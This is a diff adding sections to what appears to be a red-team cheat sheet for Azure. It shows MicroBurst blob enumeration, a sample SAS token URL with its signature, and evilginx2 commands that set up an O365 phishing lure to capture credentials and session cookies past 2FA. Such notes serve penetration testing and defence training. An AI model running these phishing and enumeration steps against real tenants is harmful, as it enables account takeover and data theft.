@@ -244,3 +244,47 @@ print("\r\n[+] Graph API")
 print("Access Token: "+json.loads(val)["access_token"])
 print("ClientID: "+json.loads(val)["client_id"])
 ```
+
+## Insecure storage
+
+Sometimes there are public storage accounts that contain sensible information. To enumerate them we can use [MicroBurst](https://github.com/NetSPI/MicroBurst)
+
+```powershell
+. MicroBurst\Misc\Invoke- EnumerateAzureBlobs.ps1
+Invoke-EnumerateAzureBlobs -Base {{ BaseName base }}
+```
+
+Also it is important to search for Shared Access Signature tokens that allow to access a storage accoutn or storage resource just providing the url. The key is to search for a url similar to this:
+
+```
+https://defcorpcodebackup.blob.core.windows.net/client?sp=rl&st=2021-09-30T14:43:49Z&se=2022-09-30T22:43:49Z&sv=2020-08-04&sr=c&sig=r%2FVCxrODcJtKKR%2FFaKFz7fl7oadmFURDwPeyRGZ6Llo%3D
+```
+
+The signature is the most important part.
+
+If we obtain a SAS token it can be used with [Azure Storage Explorer](https://azure.microsoft.com/en-us/features/storage-explorer/)
+
+![Connection to Azure Storage using SAS token](imgs/20220426004714.png) 
+
+## Phishing for credentials with [evilnginx2](https://github.com/kgretzky/evilginx2)
+
+Evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
+
+First we need to create the certificates for the SSL connection
+
+We can start evilnginx in the phishlets directory
+
+```powershell
+evilginx2 -p .\phishlets
+    config domain {{ Domain phish.corp }}
+    config ip 172.16.150.4
+
+    # Run the stuff
+    phishlets hostname o365 login.{{ Domain phish.corp }}
+    phishlets get-hosts o365
+
+    phishlets enable o365
+
+    lures create o365
+    lures get-url 0
+```
